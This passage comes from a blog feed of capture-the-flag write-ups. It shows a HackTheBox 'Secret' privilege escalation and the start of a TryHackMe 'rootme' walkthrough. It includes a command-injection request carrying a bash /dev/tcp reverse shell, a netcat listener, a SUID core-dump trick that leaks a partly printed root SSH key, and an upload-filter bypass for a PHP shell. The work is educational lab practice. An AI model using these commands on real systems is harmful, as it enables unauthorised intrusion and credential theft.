<p>This time I&rsquo;ll setup a netcat listener and send URL-encoded bash reverse shell</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
</span></span><span class="line"><span class="cl">$ curl -s -H <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class="s2">&#34;http://secret.htb:3000/api/logs?file=%3E%2fdev%2fnull|bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.28%2F88%200%3E%261%22&#34;</span>
</span></span></code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.14.28»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">88</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">88</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.28<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.120<span class="o">]</span> <span class="m">46050</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>2131<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dasith<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dasith<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dasith<span class="o">)</span>
</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$
</span></span></code></pre></div><p>I&rsquo;ll upgrade my shell so it can be more interactive</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:~/local-web$ script /dev/null -c bash
</span></span><span class="line"><span class="cl">script /dev/null -c bash
</span></span><span class="line"><span class="cl">Script started, file is /dev/null
</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7417</span> suspended  nc -nvlp <span class="m">88</span>
</span></span><span class="line"><span class="cl">→ kali@kali «~» «10.10.14.28»
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7417</span> continued  nc -nvlp <span class="m">88</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$
</span></span></code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:~$ cat user.txt
</span></span><span class="line"><span class="cl">c95a3f...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Doing a recursive search with the <code>find</code> command reveal a crash file</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/opt$ find / -type f -user dasith 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;proc\|\.npm\|local-web&#39;</span>
</span></span><span class="line"><span class="cl">/var/crash/_opt_count.1000.crash
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>That naming lead me to <code>/opt</code>, where I find a C code, a binary, and a log file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/$ ls /opt/
</span></span><span class="line"><span class="cl">code.c  count  valgrind.log
</span></span><span class="line"><span class="cl">dasith@secret:/$ <span class="nb">cd</span> /opt/
</span></span><span class="line"><span class="cl">dasith@secret:/opt$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">56</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root  <span class="m">4096</span> Oct  <span class="m">7</span> 10:06 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">20</span> root root  <span class="m">4096</span> Oct  <span class="m">7</span> 15:01 ..
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">3736</span> Oct  <span class="m">7</span> 10:01 code.c
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">16384</span> Oct  <span class="m">7</span> 10:01 .code.c.swp
</span></span><span class="line"><span class="cl">-rwsr-xr-x  <span class="m">1</span> root root <span class="m">17824</span> Oct  <span class="m">7</span> 10:03 count
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">4622</span> Oct  <span class="m">7</span> 10:04 valgrind.log
</span></span></code></pre></div><p>The binary drews my attention because it has SUID bit.</p>
<p>When I run it, it asks for a file/directory and when it finishes, I&rsquo;m given with an option to save the results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/opt$ ./count
</span></span><span class="line"><span class="cl">Enter <span class="nb">source</span> file/directory name: /root/root.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Total <span class="nv">characters</span> <span class="o">=</span> <span class="m">33</span>
</span></span><span class="line"><span class="cl">Total <span class="nv">words</span>      <span class="o">=</span> <span class="m">2</span>
</span></span><span class="line"><span class="cl">Total <span class="nv">lines</span>      <span class="o">=</span> <span class="m">2</span>
</span></span><span class="line"><span class="cl">Save results a file? <span class="o">[</span>y/N<span class="o">]</span>: y
</span></span><span class="line"><span class="cl">Path: /tmp/test
</span></span><span class="line"><span class="cl">dasith@secret:/opt$ cat /tmp/test
</span></span><span class="line"><span class="cl">Total <span class="nv">characters</span> <span class="o">=</span> <span class="m">33</span>
</span></span><span class="line"><span class="cl">Total <span class="nv">words</span>      <span class="o">=</span> <span class="m">2</span>
</span></span><span class="line"><span class="cl">Total <span class="nv">lines</span>      <span class="o">=</span> <span class="m">2</span>
</span></span></code></pre></div><p>From here, I&rsquo;ll look into the C code.</p>
<h4 id="source-code-analysis-1">Source Code Analysis</h4>
<p>Since the rests isn&rsquo;t that important, I&rsquo;ll start from the main function.</p>
<p>In the code snippet below, the first thing that this program do is ask the user for input and then it decides which functions to call: <code>dircount</code> if the input is a directory and <code>filecount</code> if the input is a file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">stat</span> <span class="n">path_s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">summary</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter source file/directory name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%99s&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">stat</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">path_s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">S_ISDIR</span><span class="p">(</span><span class="n">path_s</span><span class="p">.</span><span class="n">st_mode</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nf">dircount</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nf">filecount</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
</span></span></code></pre></div><p>The next thing this program do is dropping the root privilege to normal user, and then it&rsquo;s forced to generate a <a href="https://en.wikipedia.org/wiki/Core_dump">core dump</a>. Lastly, it&rsquo;ll ask whether the user wants to save the result or not.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// drop privs to limit file write
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">setuid</span><span class="p">(</span><span class="nf">getuid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Enable coredump generation
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_DUMPABLE</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Save results a file? [y/N]: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">121</span> <span class="o">||</span> <span class="n">res</span> <span class="o">==</span> <span class="mi">89</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Path: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%99s&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">&#34;a&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fputs</span><span class="p">(</span><span class="n">summary</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Could not open %s for writing</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The key here is that, with core dump enabled (<code> prctl(PR_SET_DUMPABLE, 1)</code>), when the program crashes, the memory state of this program will be recorded and dumped to a crash file. That file is typically used for diagnosing the program fault.</p>
<h4 id="abuse-core-dump---force-crash">Abuse Core Dump - Force Crash</h4>
<p>When I open a file like <code>/root/.ssh/id_rsa</code> in this program and if by accident it crashes, the content of that <code>id_rsa</code> will definitely got dumped into the crash file.</p>
<p>Now the question is, how to intentionally crash this program?</p>
<p>According to <a href="https://stackoverflow.com/questions/6561194/force-a-core-to-dump-from-an-active-normally-running-program-on-freebsd">this post</a> on StackOverFlow, sending <code>kill -11</code> can trigger a crash on a program, which eventually produces a core dump.</p>
<p>First, I will open another sessions, so I have two in total. On the first session, I&rsquo;ll run the <code>count</code> program  and keep it running in the result section.</p>
<pre tabindex="0"><code>dasith@secret:/tmp/$ /opt/count
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: y
Path: 
</code></pre><p>Then on the other session, you guess it, I will send a kill signal to crash the program.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/opt$ <span class="nb">kill</span> -11 <span class="k">$(</span>pidof count<span class="k">)</span>
</span></span></code></pre></div><p>It crashes</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Enter <span class="nb">source</span> file/directory name: /root/.ssh/id_rsa
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Total <span class="nv">characters</span> <span class="o">=</span> <span class="m">2602</span>
</span></span><span class="line"><span class="cl">Total <span class="nv">words</span>      <span class="o">=</span> <span class="m">45</span>
</span></span><span class="line"><span class="cl">Total <span class="nv">lines</span>      <span class="o">=</span> <span class="m">39</span>
</span></span><span class="line"><span class="cl">Save results a file? <span class="o">[</span>y/N<span class="o">]</span>: y
</span></span><span class="line"><span class="cl">Path: Killed
</span></span></code></pre></div><p>The crash file is generated under <code>/var/crash/</code>.</p>
<pre tabindex="0"><code>dasith@secret:/tmp$ ls -l /var/crash/_opt_count.1000.crash
-rw-r----- 1 dasith dasith 28717 Oct 31 08:39 /var/crash/_opt_count.1000.crash
</code></pre><p>The crash file can be <a href="https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash">unpacked</a> into a separate files using the <code> apport-unpack</code> utility, which also installed in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/tmp/$ mkdir .syncrst <span class="o">&amp;&amp;</span> apport-unpack /var/crash/_opt_count.1000.crash .syncrst
</span></span><span class="line"><span class="cl">dasith@secret:/tmp/$ ls -la .syncrst
</span></span><span class="line"><span class="cl">total <span class="m">440</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> dasith dasith   <span class="m">4096</span> Oct <span class="m">31</span> 08:43 .
</span></span><span class="line"><span class="cl">drwxrwxrwt <span class="m">16</span> root   root     <span class="m">4096</span> Oct <span class="m">31</span> 08:25 ..
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">5</span> Oct <span class="m">31</span> 08:43 Architecture
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith <span class="m">380928</span> Oct <span class="m">31</span> 08:43 CoreDump
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">1</span> Oct <span class="m">31</span> 08:43 CrashCounter
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">24</span> Oct <span class="m">31</span> 08:43 Date
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">12</span> Oct <span class="m">31</span> 08:43 DistroRelease
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ExecutablePath
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ExecutableTimestamp
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">5</span> Oct <span class="m">31</span> 08:43 ProblemType
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ProcCmdline
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ProcCwd
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">64</span> Oct <span class="m">31</span> 08:43 ProcEnviron
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith   <span class="m">2144</span> Oct <span class="m">31</span> 08:43 ProcMaps
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith   <span class="m">1343</span> Oct <span class="m">31</span> 08:43 ProcStatus
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">2</span> Oct <span class="m">31</span> 08:43 Signal
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">29</span> Oct <span class="m">31</span> 08:43 Uname
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">3</span> Oct <span class="m">31</span> 08:43 UserGroups
</span></span></code></pre></div><p>The CoreDump file is the one that contains the <code>id_rsa</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/tmp/$ cat .syncrst/CoreDump
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">□☺□$□□□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□wȏ♥□□□xWU□□□□□□□□□□□xWU□□□□□□wȏ<span class="sb">`</span>□wȏ◄►-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span class="line"><span class="cl">NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3
</span></span><span class="line"><span class="cl">KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9
</span></span><span class="line"><span class="cl">6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl
</span></span><span class="line"><span class="cl">xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k
</span></span><span class="line"><span class="cl"><span class="nv">fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA</span><span class="o">==</span>
</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>With that key, I can SSH login as root and grab the root flag!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
</span></span><span class="line"><span class="cl">$ ssh -i coredump.ssh root@10.10.11.120
</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.11.120 (10.10.11.120)&#39;</span> can<span class="s1">&#39;t be established.
</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:YNT38/psf6LrGXZJZYJVglUOKXjstxzWK5JJU7zzp3g.
</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.10.11.120<span class="err">&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-89-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Sun <span class="m">31</span> Oct <span class="m">2021</span> 08:16:22 AM UTC
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:             <span class="m">223</span>
</span></span><span class="line"><span class="cl">  Usage of /:   52.8% of 8.79GB   Users logged in:       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  Memory usage: 20%               IPv4 address <span class="k">for</span> eth0: 10.10.11.120
</span></span><span class="line"><span class="cl">  Swap usage:   0%
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">0</span> updates can be applied immediately.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Sun Oct <span class="m">31</span> 07:47:50 <span class="m">2021</span> from 10.10.14.91
</span></span><span class="line"><span class="cl">root@secret:~# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@secret:~# cat root.txt
</span></span><span class="line"><span class="cl">d1d6d....<span class="o">[</span>SNIP<span class="o">]</span>....
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>TryHackMe - rootme</title>
      <link>https://fahmifj.github.io/tryhackme/rootme/</link>
      <pubDate>Fri, 02 Jul 2021 22:08:48 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/tryhackme/rootme/</guid>
      <description>A ctf for beginners, can you root me?</description>
      <content:encoded><![CDATA[<fieldset>
<legend>Room Information </legend>
<ul>
<li><strong>Name:</strong>  <a href="https://tryhackme.com/room/rrootme">rootme</a></li>
<li><strong>Category:</strong> Boot2root</li>
<li><strong>Difficulty:</strong> Easy</li>
<li><strong>Tools:</strong>
<ul>
<li>Nmap</li>
<li>Gobuster</li>
</ul>
</li>
<li><strong>Skills Learned</strong>:
<ul>
<li>Web enumeration</li>
<li>SUID exploitation</li>
</ul>
</li>
</ul>
</fieldset>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan discovers two open ports: SSH on port 22 and HTTP on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «rootme» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.215.165                      
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-29 23:35 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.215.165
</span></span><span class="line"><span class="cl">Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.26s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65533</span> resets
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 96.24 seconds
</span></span></code></pre></div><p>Running a script scan didn&rsquo;t really helpful, so I&rsquo;ll dig the website on port 80.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the website doesn&rsquo;t display anything except a prompt-like text &ldquo;root@rootme:~#&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210530105241967.png" alt="image-20210530105241967"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p>A <code>Gobuster</code> scan discovers several directories on this website, ones of which interesting are <code>/uploads</code> and <code>/panel</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «rootme» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://10.10.215.165/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -z
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.215.165/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/29 23:37:44 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/js/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/css/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/uploads/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/panel                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/panel/<span class="o">]</span>  
</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>                 
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/29 23:43:21 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><h4 id="panel">/panel</h4>
<p>On <code>/panel</code>, there is an upload form, but it blocks a file with <code>.php</code> extensions.</p>
<p><div class="img-container"><img src="imgs/image-20210530105345640.png" alt="image-20210530105345640"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="upload-filter-bypass">Upload filter bypass</h4>
<p>Uploading a file with extension <code>.phtml</code> bypasses the upload filter. The uploaded file can be found at <code>/uploads/[here]</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210530105538891.png" alt="image-20210530105538891"  /></div>
</p>
<h4 id="reverse-shell">Reverse shell</h4>
<p>I&rsquo;ll upload the following file and setup a listener to get a shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «rootme» «10.9.30.115»  
</span></span><span class="line"><span class="cl">$ cat iamf.phtml    
</span></span><span class="line"><span class="cl">&lt;?php
